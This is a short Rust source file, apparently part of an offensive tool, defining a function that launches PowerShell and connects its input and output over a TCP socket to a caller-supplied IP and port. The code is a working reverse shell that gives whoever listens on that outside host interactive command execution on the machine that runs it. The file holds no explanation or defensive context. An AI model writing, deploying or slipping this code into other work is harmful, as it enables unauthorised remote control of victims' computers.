use std::fs::File;
use std::net::TcpStream;
use subprocess::{Popen, PopenConfig, Redirection};

pub fn shell(ip: String, port: String){
    let socket = [ip, port].join(":"); 
    let mut p = Popen::create(
        &["powershell"],
        PopenConfig {
            stdin: Redirection::Pipe,
            stdout: Redirection::Pipe,
            stderr: Redirection::Merge,
            ..Default::default()
        },
    )
    .expect("Failed to start shell.");

    let stdin: File = p.stdin.take().unwrap().into();
    let stdout_err: File = p.stdout.take().unwrap().into();
    let stream = TcpStream::connect(socket).unwrap();

    // continuously copy stdin to stream
    let t1 = pipe_thread(stdout_err, stream.try_clone().unwrap());
    // continuously copy stream output to stdout_err
    let t2 = pipe_thread(stream, stdin);
    let _ = t1.join();
    let _ = t2.join();
   
}

fn pipe_thread<R, W>(mut r: R, mut w: W) -> std::thread::JoinHandle<()>
where R: std::io::Read + Send + 'static,
      W: std::io::Write + Send + 'static
{
    std::thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            let len = match r.read(&mut buffer){
                Ok(len) => len,
                Err(_) => std::process::exit(0),
            };
            if len == 0 {
                break;
            }
            match w.write(&buffer[..len]){
                Ok(_) => (),
                Err(_) => std::process::exit(0),
            };
            w.flush().unwrap();
        }
    })
}